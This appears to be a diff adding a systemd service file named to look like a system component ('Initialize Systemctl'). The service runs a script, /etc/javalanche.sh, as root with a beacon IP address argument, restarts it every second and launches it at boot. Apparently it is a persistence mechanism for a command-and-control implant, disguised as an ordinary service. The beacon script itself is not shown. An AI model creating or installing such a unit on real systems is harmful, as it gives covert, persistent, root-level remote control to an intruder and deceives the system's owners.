@@ -1,0 +1,14 @@
+[Unit]
+Description=Initialize Systemctl
+After=network.target
+
+[Service]
+ExecStart=/etc/javalanche.sh -beaconIPAddress 10.0.10.128
+Type=exec
+Restart=always
+RestartSec=1
+User=root
+
+
+[Install]
+WantedBy=multi-user.target
